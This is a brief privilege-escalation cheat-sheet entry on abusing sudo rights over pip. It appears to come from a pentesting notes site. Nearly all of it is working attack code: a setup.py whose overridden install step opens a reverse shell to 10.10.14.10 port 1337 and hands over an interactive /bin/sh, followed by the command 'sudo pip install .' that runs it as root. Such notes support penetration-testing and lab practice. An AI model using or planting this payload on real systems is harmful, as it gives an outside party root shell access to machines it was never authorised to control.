---
title: "pip"
date: 2024-7-5
tags: ["pip", "pip3", "python", "sudo", "privesc"]
---

---
### SUDO

#### 1. Create a setup.py

```python
#!/usr/bin/env python3

from setuptools.command.install import install
from setuptools import setup
import os
import socket
import subprocess

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.14.10",1337)) # CHANGE HERE
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh", "-i"])

setup(
    cmdclass={
        "install": Exploit
    }
)
```

#### 2. Exploit

```bash
# Run
sudo pip install .
```

<br>